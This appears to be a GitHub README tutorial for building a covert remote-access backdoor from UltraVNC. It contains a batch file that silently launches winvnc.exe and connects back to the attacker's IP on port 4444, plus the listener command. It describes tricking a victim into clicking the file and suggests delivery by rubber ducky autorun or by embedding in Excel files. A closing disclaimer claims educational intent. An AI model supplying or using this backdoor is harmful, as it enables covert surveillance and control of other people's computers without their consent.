# VNC_Backdoor

This focuses on how you can create a simple backdoor with a reverse connection using UltraVNC

## Installation

Use the [url](https://uvnc.com/downloads/ultravnc/159-ultravnc-1-4-3-6.html) to install UltraVNC in the Spy's Computer.
![image](https://github.com/user-attachments/assets/86f9fb03-70f3-423d-ad7d-4b176137d669)
![image](https://github.com/user-attachments/assets/953416e5-db3d-4423-8232-f6ddbd4f0088)




## Usage

### SPY'S Computer

After installation, go to the folder where you installed UltraVNC and click on winVNC.exe
![image](https://github.com/user-attachments/assets/8eacdacc-2fd0-4926-8fc2-fbde0acd0a1a)



Then click on uvnc_settings.exe

![image](https://github.com/user-attachments/assets/215b36d2-0589-46bb-947f-230ed2610db6)

Create a password for VNC and View-Only Password.
![image](https://github.com/user-attachments/assets/7e8c165b-45c6-4509-a391-b205ce2eb45f)


Then create a folder in the same directory for the client/victim. 

The name could be anything but for this assessment I would create a folder called "client".
Copy the below files to the client directory.
![image](https://github.com/user-attachments/assets/36f7da7d-b951-40d8-b23f-a679dd1b96d6)
![image](https://github.com/user-attachments/assets/cb265e88-a2bd-4dfc-8f36-823666883855)




Now go to cmd and find your IP address using the command:
```
ipconfig
```
![image](https://github.com/user-attachments/assets/f0098f79-e72b-4262-813c-890a64f92072)




Now in the client folder create a batch file with the following code:
```
@echo off
start winvnc.exe -run
timeout /t 1 >nul
start winvnc.exe -connect "yourIPAddress":4444
```


![image](https://github.com/user-attachments/assets/e22cb124-2476-4dd3-a8be-bcf855e2de30)



Note:"I have used my ip address in the screenshot"
* This works in the order where when the client clicks the bat file winvnc.exe runs 
* The timeout function allows the app to open completely
* Then the VNC app tries to connect to the spy's ip address on port 4444

Then go to the directory where ultraVNC is installed and open cmd in the same folder.

Type the following commands in CMD

```
vncviewer -listen 4444
```
![image](https://github.com/user-attachments/assets/dc50538c-eadf-4a56-8b6b-8f0c79efe155)



This would create a server that is listening on port 4444 for any connections.

You would get a tray icon on your system's tray when you run the command.
![image](https://github.com/user-attachments/assets/833334d4-3e02-446a-a04d-29c6b8271b83)


### Victim's Computer

If We successfully manage to share the client folder that we created earlier to be downloaded by the victim,
and if we manage to make make the user click on the .bat file, the victim's computer would connect to our server allowing us to see his activity and to control it.

For the sake of this tutorial I have used an instance of windows in virtualBox
![image](https://github.com/user-attachments/assets/07f16e22-bb03-450b-9bfe-2aad14087ca9)




## Proof of Effectiveness

Spy's PC's Screen
![image](https://github.com/user-attachments/assets/9fc32be4-490f-4c2e-bc8f-d8473c3daa31)



Victim's PC's Screen
![image](https://github.com/user-attachments/assets/7d515335-85e9-47b9-a4db-ba7a92788c00)


## Conclusion
THis can really be effictive if this script was used in a rubber ducky with autorun script to mess with your mate's computer for **PRANKS**.
This can also be used by embeding it with excel files.
The usage of this can really depend on the skill of the person.

## Disclamer
I do not condone in helping anyone in stealing data and violating the privacy of anyone. All of this is for educational purposes only.


